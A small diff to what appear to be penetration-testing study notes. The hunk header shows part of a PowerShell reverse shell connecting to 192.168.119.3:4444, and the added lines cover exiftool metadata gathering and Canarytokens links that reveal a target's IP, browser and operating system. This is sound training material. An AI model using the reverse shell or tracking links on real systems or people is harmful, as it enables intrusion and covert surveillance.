@@ -251,5 +251,6 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444)
 
 # Client-side Info Gathering
 
-- Grab metadata from Document: ```exiftool -a -u brochure.pdf```
+- Grab metadata from Document: ```exiftool -a -u <filename>```
+- Canarytokens, a free web service that generates a link with an embedded token to send to the target. When the target opens the link in a browser, we will get information about their browser, IP address, and operating system. >> ```https://canarytokens.org/generate```
 - 
